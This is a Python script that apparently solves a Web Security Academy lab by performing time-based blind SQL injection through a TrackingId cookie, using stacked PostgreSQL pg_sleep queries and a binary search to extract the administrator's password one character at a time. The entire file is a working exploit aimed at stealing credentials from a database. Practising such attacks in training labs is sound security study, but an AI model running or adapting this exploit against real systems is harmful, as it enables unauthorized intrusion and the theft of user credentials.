#!/usr/bin/python3

import requests, urllib, string

url = 'https://ac981fc31fe63b2b809e1c4d00b300b3.web-security-academy.net/'

def getrequest(url,payload):
    return requests.get(url, headers = {'Cookie': 'TrackingId=xyz'+payload}).elapsed.total_seconds()

def buildPayload(arr, low, high,i):

    payload = " '%3b SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,+"+str(i)+",1)"
    if high >= low:
        mid = (low + high) // 2
        if (getrequest(url,payload + "=" + "'"+arr[mid]+"') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users --") >= 2):
            return arr[mid] 
        elif (getrequest(url,payload + "<" + "'"+arr[mid]+"') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--") >= 2):
            return buildPayload(arr, low, mid-1, i) 
        else : 
            return buildPayload(arr, mid +1 ,high,i)
    else :
        return str(-1)
    
def blindinjection():

    password = ""
    arr = buildArray()
    for i in range(1,21):
        password += buildPayload(arr,0,len(arr)-1,i)
        print("\r" + password, flush = True, end='')
    #return password

def buildArray():
    return list(string.digits)  + list(string.ascii_lowercase) 
    
def main():
    payload = " '%3b SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1) < 'm') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--"
    #print(getrequest(url,payload) >2)
    blindinjection()

if __name__ == '__main__':
    main()